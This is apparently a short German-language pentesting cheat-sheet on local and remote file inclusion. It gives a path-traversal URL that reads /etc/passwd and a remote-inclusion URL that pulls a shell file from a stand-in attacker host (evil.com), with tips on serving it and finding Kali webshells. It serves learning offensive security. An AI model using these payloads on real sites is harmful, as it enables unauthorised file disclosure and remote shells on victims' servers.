# Local File Inclusion und Remote File Inclusion

## Links

- [File Inclusion - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

## Local File Inclusion

### Basic 
- http://example.com/index.php?page=../../../etc/passwd \
Mit "../../../" wird durch das Dateisystem navigiert, um auf Dateien zuzugreifen, auf die der normale Webseitenuser nicht zugreifen sollte. \
Im Beispiel wird die Datei passwd ausgegeben.


## Remote File Inclusion

### Basic

- http://example.com/index.php?page=http://evil.com/shell.txt \
Dabei muss auf dem Rechner des Angreifers eine http Verbindung bereitgestellt werden.\
Dies ist z.B. mit Python **"python -m http.server <PORT>"** möglich. \
Der Parameter "page" des index.php Skripts ruft dann die Datei "shell.txt" auf dem Angreifer PC auf\
Ein gängiges Beispiel für eine solche Datei wie "shell.txt" wäre eine Remote Shell.\
--> Unter Kali Linux zufinden in: **/usr/share/webshells/**
